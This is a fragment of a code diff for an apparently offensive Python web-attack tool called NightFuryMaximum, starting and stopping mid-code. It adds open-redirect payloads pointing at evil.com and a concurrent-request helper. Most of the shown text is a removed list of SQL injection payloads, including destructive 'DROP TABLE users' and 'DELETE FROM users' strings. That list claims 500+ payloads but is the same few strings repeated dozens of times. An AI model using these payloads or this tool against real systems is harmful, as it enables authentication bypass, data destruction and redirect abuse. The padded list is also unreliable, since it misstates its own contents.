+                "//10.0.0.1", "//192.168.1.1", "//172.16.0.1",
+                "https://evil.com?goto=http://evil.com",
+                "https://evil.com#http://evil.com",
+                "https://evil.com/redirect?url=http://evil.com",
+            ]
+            for u in urls:
+                payloads.add(u)
+            while len(payloads) < 200:
+                payloads.add(random.choice(urls))
 
-        return sorted(list(payloads))
+        return sorted(list(payloads)) if category not in ['sqli_time', 'sqli_boolean', 'cmdi_time', 'ssti'] else list(payloads)
 
     def random_ua(self):
         """Random User-Agent"""
@@ -198,6 +584,20 @@ class NightFuryMaximum:
             self.error_count += 1
             
         return result
+    
+    def _concurrent_request(self, url_list, workers=None):
+        if workers is None:
+            workers = self.max_threads
+        results = {}
+        with ThreadPoolExecutor(max_workers=workers) as executor:
+            fut_map = {executor.submit(self.request, url): url for url in url_list}
+            for future in as_completed(fut_map):
+                url = fut_map[future]
+                try:
+                    results[url] = future.result()
+                except Exception as e:
+                    results[url] = {'success': False, 'error': str(e)}
+        return results
     
     def banner(self):
         """Display banner"""
@@ -360,527 +760,7 @@ class NightFuryMaximum:
         results = []
         print(f"  {Fore.BLUE}[1/14] Testing Error-based SQLi...{Fore.RESET}")
         
-        payloads = [
-            "'", "\"", "')", "\"))", "1' AND '1'='1", "1' AND '1'='2",
-            "' OR '1'='1'--", "' OR '1'='1'#", "' OR 1=1--", "' OR 1=1#",
-            "1' ORDER BY 100--", "1' ORDER BY 1000--", "1' UNION SELECT 1--",
-            "1' UNION SELECT 1,2--", "1' UNION SELECT 1,2,3--",
-            "'; DROP TABLE users--", "'; DELETE FROM users--",
-            # Additional 500+ Deep SQLi Payloads (Error-based)
-            "admin'--", "admin' #", "admin'/*", "' or 1=1--", "' or 1=1#", "' or 1=1/*", "') or '1'='1'--", "') or ('1'='1'--",
-            "\" or 1=1--", "\" or 1=1#", "\" or 1=1/*", "\") or \"1\"=\"1\"--", "\") or (\"1\"=\"1\"--", "admin' or '1'='1",
-            "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*", "admin'or 1=1 or ''='", "admin' or 1=1",
-            "admin' or 1=1--", "admin' or 1=1#", "admin' or 1=1/*", "admin') or ('1'='1", "admin') or ('1'='1'--",
-            "admin') or ('1'='1'#", "admin') or ('1'='1'/*", "admin') or '1'='1", "admin') or '1'='1'--", "admin') or '1'='1'#",
-            "admin') or '1'='1'/*", "123' or '1'='1", "1' or '1'='1", "-1' or 1=1", "1' or 1=1--", "1' or 1=1#",
-            "1' OR '1'='1", "1' OR 1=1", "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
